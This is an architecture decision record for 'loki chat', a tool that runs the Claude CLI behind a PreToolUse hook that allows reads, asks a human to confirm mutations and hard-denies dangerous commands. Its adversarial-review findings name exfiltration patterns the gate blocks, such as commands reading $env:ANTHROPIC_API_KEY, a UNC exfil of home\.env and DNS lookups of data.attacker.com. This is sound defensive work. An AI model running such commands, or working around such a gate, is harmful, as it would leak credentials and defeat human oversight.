# ADR-0008: Interactive mode and the confirm-on-mutation flow (`loki chat`)

Status: Accepted (2026-07-15)

## Context

`ask` and `scan` (ADR-0007) run the online engine **headless** (`claude -p`) and are strictly read-only:
the PreToolUse hook maps `read -> allow` and everything else -> `deny`, because there is no human in a
`-p` run to answer a confirmation. But the allow-list boundary (ADR-0006) was always *"read-only automatic,
anything mutating requires `ask`"* — the `ask` (confirm) half had nowhere to happen yet.

`loki chat` is where it happens: an **interactive** diagnostic session where the operator is present, so a
mutation can be **confirmed by a human** instead of denied outright. This is the third online-engine command
and the first that opens the mutation path.

## Decision

**A single env-driven mode switches the PreToolUse gate between headless (deny mutations) and interactive
(confirm mutations), and `chat` spawns `claude` attached to the terminal.** All of this lives in the existing
security core `src/lib/claude.ps1`; `src/commands/chat.ps1` is thin wiring.

- **Hook mode (`Get-LokiPreToolUseDecision -Mode`).** The gate now takes an optional `-Mode`; when absent it
  reads the `LOKI_HOOK_MODE` env var (what the live hook process does). The mapping:
  - `read -> allow` — in **every** mode.
  - `denied -> deny` — in **every** mode. The hard-block set (arbitrary code execution, `Start-Process`/
    `Invoke-Item`, `-enc`/`FromBase64`, the secret-target and UNC/side-effect denies from ADR-0007, control
    chars) is **never** offered for confirmation. A `denied` command can never become `ask` or `allow`.
  - `mutate -> ask` **only** when the mode is the exact literal `interactive`; `mutate -> deny` otherwise.
    Case-sensitive, exact-match, fail-safe: `Interactive`, `INTERACTIVE`, a typo, empty, or unset all keep the
    stricter headless behaviour. So the relaxation is opt-in and precise.
- **`LOKI_HOOK_MODE` is pinned explicitly on every build, never inherited.** `Get-LokiClaudeInvocation` sets
  `LOKI_HOOK_MODE=interactive` for `-Interactive` and `LOKI_HOOK_MODE=headless` otherwise, into the isolated
  child env. This closes an inheritance leak: a stray `LOKI_HOOK_MODE=interactive` in the *operator's own*
  shell can never flip a headless `ask`/`scan` run into confirming mutations (a unit test asserts exactly this
  — "BREAK-THE-LEAK"). The child's mode is always Loki-controlled.
- **Interactive invocation (`Get-LokiClaudeInvocation -Interactive` / `Invoke-LokiClaudeInteractive`).** The
  interactive build drops `-p`, `--output-format json`, `--max-budget-usd`, and the trailing prompt; it keeps
  `--model`, `--permission-mode default`, `--tools PowerShell`, `--settings <hook file>`,
  `--no-session-persistence`, and a chat-specific `--append-system-prompt` charter. `Invoke-LokiClaudeInteractive`
  spawns it via `ProcessStartInfo` with **no stream redirection** (the child inherits the console's
  stdin/stdout/stderr, so it is a live TUI the user drives) and `WaitForExit()` with **no timeout** (an
  interactive session runs until the user ends it). `UseShellExecute=$false` is still required to install the
  isolated child env, so the **secret still enters only via the child env block, never argv** (CLAUDE.md §5).
- **Chat charter.** Unlike the read-only ask charter (which forbids all mutation), the chat charter tells the
  model it *may* propose a mutation when genuinely needed, but that each one is gated by an interactive
  confirmation — so it must explain what and why first, propose one change at a time, and never assume
  confirmation — and that the hard-block set stays blocked regardless. Defense in depth on top of the gate.
- **Confirmation UX (Slice 1).** Loki relies on Claude Code's **built-in** interactive permission prompt,
  triggered by the hook returning `ask`, which shows the command and asks the user. No custom Loki confirm UI
  in Slice 1.
- **`default` permission mode (not `dontAsk`/`bypassPermissions`)** so that a hook `ask` actually reaches a
  prompt and a hook `allow` skips it — the same rationale as ADR-0007, now with the `ask` arm live.
- **Zero app-level footprint via isolation (not the flag).** `--no-session-persistence` is a `--print`-only
  flag, so it is **not** passed for an interactive session — it would be a silent no-op (a review finding).
  Footprint cleanliness rests on the env isolation instead (ADR-0003): `CLAUDE_CONFIG_DIR` is redirected onto
  the stick, so any interactive transcript lands there, never in the host profile. The settings temp file is
  removed on exit. The footprint gate (DESIGN.md §5.4) will measure a full `chat` session end to end.

## Consequences

- `tests/claude.Tests.ps1` table-tests the interactive gate: `mutate -> ask`, a **break-the-guard** proving a
  `denied` command stays `deny` even interactively (never `ask`/`allow`), `read -> allow`, headless stays
  strict, only the exact literal `interactive` relaxes, the `LOKI_HOOK_MODE` env fallback, the **break-the-leak**
  (parent-env `interactive` cannot flip a headless build), and the interactive invocation shape (no `-p`,
  `LOKI_HOOK_MODE=interactive`, secret out of argv). `tests/chat.Tests.ps1` tests the command's guards and its
  result -> exit-code mapping with the spawn mocked.
- **Live gate — the decision path is now verified (2026-07-15); only the terminal-bound parts remain.** The
  enforcement, mode logic, and argv/env construction are unit-tested and reviewed. The **"hook fires and gates the
  mutation"** half is now **live-verified against the real `claude` CLI**: a
  mode-probe hook run against `claude` v2.1.147 with `LOKI_HOOK_MODE=interactive` confirmed `read -> allow` (a
  `Get-Date` actually ran) and
  `mutate -> ask` (a `Set-Content` was gated — surfaced as a permission denial in `-p`, the file was **not** created,
  reason `loki-ask-mutation-requires-confirm`). So the `read`/`allow` + `mutate`/`ask` decision path is confirmed end
  to end. What still can **only** be confirmed by a human on a real interactive terminal (not by unit tests):
  1. That an interactive TUI spawned via `ProcessStartInfo` (inherited console, no redirection) renders and accepts
     input correctly when launched from `loki chat`.
  2. The **human side** of the confirm prompt: that Claude Code's interactive `ask` prompt renders and that answering
     it gates the mutation as intended (accept -> runs, decline -> blocked). The gate DECISION is verified above; the
     interactive rendering + the human "yes"/"no" is what is open.
  So `loki chat` is **enforcement-complete, adversarially unit-tested, and the gate decision is live-verified** — only
  the interactive spawn rendering and the human confirm step are unverified. This mirrors the ADR-0007 live gate.
- **Hardening from the mandatory 3-vote adversarial review (all fixed + regression-tested).** Opening the
  mutate path exposed gaps the read-only headless path had hidden:
  1. The ADR-0007 secret-target / UNC / control-char denies only screened `read`, so a `mutate` referencing the
     key (`$env:ANTHROPIC_API_KEY`, `[Environment]::GetEnvironmentVariables()`, `Set-Content x $env:...`, a UNC
     exfil of `home\.env`) became a confirmable `ask`. Those screens now run on read **or** mutate, so such a
     command is a hard `denied` — this is what makes the "never offered for confirmation" guarantee above true.
     (`GetEnvironmentVariable` was added to the secret-target patterns for the .NET env path.)
  2. The child inherited the operator's **other** auth variable (e.g. a personal `CLAUDE_CODE_OAUTH_TOKEN` while
     Loki uses the api key) via the full-parent-env copy. Every auth var except the one Loki set is now stripped
     from the child block — exactly one auth variable reaches the engine (CLAUDE.md §5).
  3. Arbitrary-exec handoffs the classifier deny-list missed (`start` alias, the `&` call operator, `.`
     dot-source) reached `ask`. They are now in the deny-list (ADR-0006), so they are `denied` for chat **and**
     ask/scan; a guard test proves the `start` pattern does not over-block `Start-*` cmdlets.
  Each finding has a break-the-guard regression test in `tests/`.
- **Known residuals (accepted, rated LOW by the review — pre-existing ADR-0006 classifier characteristics, not
  chat-specific):** network-read cmdlets auto-allow with an arbitrary target (`Resolve-DnsName data.attacker.com`,
  `nslookup ...`, `Test-NetConnection host -Port 443`), which is a low-bandwidth outbound channel inherent to
  auto-allowing network diagnostics; and `Get-Credential` is a genuine `Get-*` Cmdlet so it auto-allows and can
  pop a credential dialog (a phishing surface). Restricting network-read *targets* or special-casing
  `Get-Credential` is a broader allow-list design question, deferred. The full-parent-env seeding into the child
  (ADR-0007 residual) also remains, now mitigated on the mutate path too by the secret-target hardening above.
- **Deferred (documented, not done here):** passing an initial user message into the interactive session (needs
  the live invocation verified first); a richer Loki-side confirmation UI over Claude Code's built-in prompt;
  a `fix` flow with dry-run and rollback (DESIGN.md Stage 2).
- The gate stays engine-agnostic and single-sourced: `read`/`mutate`/`denied` is still decided in exactly one
  place (`Resolve-LokiCommandDecision` over `lib/allowlist.ps1`, ADR-0006); interactive mode only changes what
  the *hook* does with a `mutate`, never the classification.
